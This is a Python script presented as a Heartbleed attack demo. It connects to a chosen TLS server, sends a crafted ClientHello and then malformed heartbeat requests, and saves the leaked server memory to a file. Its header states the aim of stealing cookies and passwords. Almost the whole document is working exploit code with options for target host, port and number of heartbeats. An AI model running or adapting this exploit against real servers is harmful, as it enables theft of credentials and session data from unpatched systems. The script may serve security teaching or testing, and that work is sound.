'''
Author: Vishvajeet Subhash Patil
Heartbleed Attack Demo ..

Note -- Heartbleed attack in worst case is able to guess the private key of server but for that server needs
to be quite busy, which can be achieved only on production site with heartbleed vulnerability.So we will restrict
ourselves to obtaining confidential cookies and passwords

'''
import sys
import struct
import argparse
import binascii
import types
import socket
import os

def h2bin(x):
	return binascii.unhexlify(x.replace(' ', '').replace('\n', ''))

hello_message = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
''')

heartbeat = h2bin('''
18 03 02 00 03
01 40 00
''')

parser = argparse.ArgumentParser(description="Perform Heartbleed Attack On server")
parser.add_argument(dest='host',type=str,help='Host to perform heartbleed on',default='localhost',nargs='?')
parser.add_argument('-p',dest='port',type=int,help='Host to perform heartbleed on',default=443)
parser.add_argument('-f',dest='floc',type=str,help='File address for creating memory dump',default='memdump.bin')
parser.add_argument('-c',dest='count',type=int,help='The number of heartbeats to send',default=1)
parser.add_argument('-gf',help='To get full memory details',action='store_const',const=True)
args = parser.parse_args()
port = args.port
host = args.host
floc = args.floc
count = args.count
getfull = args.gf
#parser.add_argument('-p',type=int,help='The port on which secure server in running')

'''
Step 1: Connect to the server with the best possible encryption since attack works irrelvant of that.
'''
dump = open(floc,'wb+')
def heartbleed():
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		sock.connect((host,port))
	except Exception as e:
		print(e)
		sys.exit(0)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	sock.send(hello_message)
	while True:
		ssl_header = sock.recv(5)
		(content_type, version, length) = struct.unpack('>BHH', ssl_header)
		if content_type == 21:
			print("Error Occured")
			sys.exit(0)
		data = sock.recv(length)
		if content_type == 21:
			print("Handshake Failed")
			sys.exit(0)
		#print(data)
		if content_type ==22 and length == 4 and data[0] == 0x0E:
			break
	for i in range(0,4):
		sock.send(heartbeat)
		while True:
			ssl_header = sock.recv(5)
			if len(ssl_header)==0 :
				print("Hello")
				print('Server Not Vulnerable')
				sys.exit(0)
			(content_type, version, length) = struct.unpack('>BHH', ssl_header)
			print(str(content_type) + " "+ str(length))
			data = sock.recv(length)
			#print(data)
			if content_type == 21:
				print('Server Not Vulnerable')
				sys.exit(0)
			if content_type == 24:
				dump.write(data)
			break
for i in range(0,count):
	heartbleed()
dump.close()